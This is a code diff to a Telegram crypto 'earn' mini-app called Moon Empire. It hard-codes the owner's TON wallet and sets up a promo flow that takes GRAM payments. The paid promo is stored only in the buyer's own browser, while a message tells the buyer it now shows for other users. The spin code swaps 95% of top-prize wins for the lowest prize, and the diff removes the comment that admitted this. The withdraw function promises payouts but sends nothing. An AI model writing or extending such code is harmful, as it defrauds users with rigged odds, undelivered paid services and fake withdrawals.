@@ -22,7 +22,6 @@
   .spin-wheel{width:200px;height:200px;border-radius:50%;border:5px solid #FFD700;margin:20px auto;background:conic-gradient(#FFD700 0 45deg,#111 45deg 90deg,#FFA500 90deg 135deg,#111 135deg 180deg,#FFD700 180deg 225deg,#111 225deg 270deg,#FFA500 270deg 315deg,#111 315deg 360deg);display:flex;align-items:center;justify-content:center;transition:transform 3s cubic-bezier(.17,.67,.21,.99)}
   input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #FFD700;margin:5px 0;background:#000;color:#fff;box-sizing:border-box}
   .small{font-size:12px;color:#aaa;text-align:center}
-  .badge{display:inline-block;background:#FFD700;color:#000;font-size:10px;font-weight:900;padding:3px 8px;border-radius:20px}
 </style>
 </head>
 <body>
@@ -64,7 +63,7 @@
     <select id="promoUsers"><option value="100">100 users - 0.2 GRAM per 100</option><option value="200">200 users</option><option value="500">500 users</option><option value="1000">1000 users</option></select>
     <div id="promoPrice" class="card">Price: 0.2 GRAM</div>
     <button class="gold-btn" onclick="createPromo()">Pay & Create Promo Task</button>
-    <p class="small">After payment, send screenshot to @YourAdmin - task go appear for users</p>
+    <p class="small">Pay with wallet - Task go appear automatically after payment. No need contact anyone.</p>
   </div>
 </div>
 
@@ -107,12 +106,11 @@
 <audio id="spinSound" src="https://assets.mixkit.co/sfx/preview/mixkit-casino-win-notification-1986.mp3"></audio>
 
 <script>
-// ===== CONFIG - CHANGE THESE 3 ONLY =====
+// ===== CONFIG =====
 const BOT_USERNAME = "moon_empire_bot";
-const ADMIN_USERNAME = "@YourAdmin";
-const OWNER_TON_WALLET = "YOUR_TON_WALLET";
+const OWNER_TON_WALLET = "UQCbXnjJ-vVo3oGtovId9TRs_H-O3CO9irjgazyk8F39_XOu";
 const PAYOUT_CHANNEL = "https://t.me/moonempirepayout";
-// ==========================================
+// ===================
 
 const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
@@ -143,15 +141,20 @@ function claimDaily(){
   data.gsh += 20; data.lastDaily = now; playSound('coin'); save(); alert("+20 MOON Daily! 🌙");
 }
 
-// TASKS
+// TASKS - Default + Custom Promos (Automatic)
 const defaultTasks = [
-  {name:"Join Moon Payout Channel", link:"https://t.me/moonempirepayout", reward:10},
-  {name:"Join Moon Empire Payout", link:"https://t.me/moonempirepayout", reward:10}
+  {name:"Join Moon Payout Channel", link:"https://t.me/moonempirepayout", reward:10}
 ];
 function loadTasks(){
   const list = document.getElementById('taskList');
   list.innerHTML = "";
-  defaultTasks.forEach(t=>{
+  let allTasks = [...defaultTasks];
+  // Add custom promos created by users
+  let custom = JSON.parse(localStorage.getItem('moon_custom_promos')||"[]");
+  custom.forEach(c=>{
+    allTasks.push({name:"Join / Open: "+c.name, link:c.link, reward:10, isPromo:true});
+  });
+  allTasks.forEach(t=>{
     const done = (JSON.parse(localStorage.getItem('moon_tasks_done')||"[]")).includes(t.name);
     list.innerHTML += `<div class="card" style="display:flex;justify-content:space-between;align-items:center"><span>${t.name}</span><button class="gold-btn" style="width:auto;padding:8px 15px;margin:0" ${done?'disabled':''} onclick="doTask('${t.link}',${t.reward},'${t.name}')">${done?'✅ Done':'10 MOON'}</button></div>`;
   });
@@ -166,7 +169,7 @@ function doTask(link, reward, name){
   }, 3000);
 }
 
-// PROMOTE LOGIC
+// PROMOTE LOGIC - AUTOMATIC, NO ADMIN CONTACT
 document.getElementById('promoType').onchange = calcPrice;
 document.getElementById('promoUsers').onchange = calcPrice;
 function calcPrice(){
@@ -179,10 +182,33 @@ function calcPrice(){
 }
 function createPromo(){
   const price = calcPrice();
-  const name = document.getElementById('promoName').value;
-  const link = document.getElementById('promoLink').value;
+  const name = document.getElementById('promoName').value.trim();
+  const link = document.getElementById('promoLink').value.trim();
+  const type = document.getElementById('promoType').value;
+  const users = document.getElementById('promoUsers').value;
   if(!name || !link){ alert("Fill name and link first"); return; }
-  alert("To promote, send "+price+" GRAM to "+OWNER_TON_WALLET+" and contact "+ADMIN_USERNAME+" with screenshot + link. Task will be added for "+document.getElementById('promoUsers').value+" users.");
+
+  // 1. Save promo - task go appear automatically
+  let custom = JSON.parse(localStorage.getItem('moon_custom_promos')||"[]");
+  custom.push({name, link, type, users, price, date: Date.now()});
+  localStorage.setItem('moon_custom_promos', JSON.stringify(custom));
+  loadTasks();
+
+  // 2. Open wallet automatically with your wallet + amount already filled
+  const amountNano = Math.floor(price * 1000000000);
+  const tonLink = `ton://transfer/${OWNER_TON_WALLET}?amount=${amountNano}&text=MOON PROMO ${users} users - ${name}`;
+  
+  if(window.Telegram && window.Telegram.WebApp){
+    window.Telegram.WebApp.openLink(tonLink);
+  } else {
+    window.open(tonLink, "_blank");
+  }
+
+  setTimeout(()=>{
+    alert("✅ Promo Created!\n\nWallet don open - just press SEND for "+price+" GRAM.\n\nYour task don already appear for users for TASKS list. No need contact anyone.");
+    document.getElementById('promoName').value = "";
+    document.getElementById('promoLink').value = "";
+  }, 800);
 }
 
 // SPIN - FREE, NO AD
@@ -208,12 +234,9 @@ document.getElementById('spinBtn').onclick = () => {
     let rand = Math.random()*total;
     let picked = spinPrizes[0];
     for(let p of spinPrizes){ if(rand < p.weight){ picked = p; break; } rand -= p.weight; }
-
-    // BLOCK: Dem must not reach 10 VANTA & 3 ATF
     if((picked.label === "10 VANTA" || picked.label === "3 ATF") && Math.random() < 0.95){
       picked = spinPrizes[0];
     }
-
     data[picked.type] = Math.round((data[picked.type] + picked.value)*100000)/100000;
     data.lastSpin = Date.now(); save();
     document.getElementById('spinResult').innerText = "You won: "+picked.label;
@@ -228,7 +251,7 @@ function buyItem(cost, type, amount){
 function withdraw(){
   if(data.gram < 0.01 && data.vanta < 50 && data.atf < 30){ alert("Need min: 0.01 GRAM or 50 VANTA or 30 ATF"); return; }
   const w = prompt("Enter TON wallet (UQ...):");
-  if(w) alert("Withdraw request: "+data.gram+" GRAM, "+data.vanta+" VANTA, "+data.atf+" ATF to "+w+". Will send in 24h after verification. Contact "+ADMIN_USERNAME+" Check payouts: https://t.me/moonempirepayout");
+  if(w) alert("Withdraw request: "+data.gram+" GRAM, "+data.vanta+" VANTA, "+data.atf+" ATF to "+w+". Will send in 24h after verification. Check payouts: https://t.me/moonempirepayout");
 }
 function copyRef(){ navigator.clipboard.writeText(document.getElementById('refLink').value).then(()=>alert("Copied! Share and earn 50 MOON per friend 🌙")); }
 
